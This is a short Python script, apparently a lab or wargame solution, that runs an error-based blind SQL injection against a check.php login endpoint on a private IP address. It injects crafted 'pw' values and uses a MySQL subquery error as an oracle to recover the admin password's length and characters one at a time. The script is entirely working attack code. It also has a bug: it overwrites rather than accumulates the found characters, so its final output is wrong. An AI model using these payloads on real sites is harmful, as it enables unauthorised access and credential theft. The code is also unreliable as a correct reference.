import requests

passwd_len='0'
res_pw=''

url = 'http://192.168.197.137:8001/check.php?id=admin&pw='
cookie = {'PHPSESSIONID':''}

for i in range(1,100):
    param = "%27 or if(id='admin' and length(pw)={},(select 1 union select 2),1)%23".format(i)
    res = requests.get (url=url+param, cookies=cookie)
    if 'Subquery returns more than 1 row' in res.text:
        passwd_len = i
        break
    else:
        pass
    
print('[*] Found Password Length : %d' %passwd_len)

for i in range(1, passwd_len+1):
    for j in range(32, 128):
        param = "%27 or if(id='admin' and ord(substr(pw,{},1))={}, (select 1 union select 2), 1)%23".format(str(i), str(j))
        res = requests.get(url=url+param, cookies=cookie)
        
        if 'Subquery' in res.text:
            break
    res_pw = chr(j)
    print('[*] Found Password Char: %s' % res_pw)

print('----------------------------------------')
print('[*] Found Password : %s' % res_pw)
print('----------------------------------------')